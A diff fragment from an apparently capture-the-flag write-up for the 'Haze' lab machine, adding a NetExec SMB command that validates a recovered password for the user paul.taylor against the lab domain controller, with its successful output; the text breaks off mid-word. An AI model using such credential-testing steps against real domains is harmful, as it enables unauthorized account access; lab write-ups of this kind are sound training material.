@@ -273,3 +273,9 @@ Ld@p_Auth_Sp1unk@2k24
 ```
 Since this was for the user paul taylor, ill try some possible combinations for paul, before trying something like username anarchy.
 
+```python
+nxc smb dc01.haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24'
+SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.223   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
+```
+This useriu
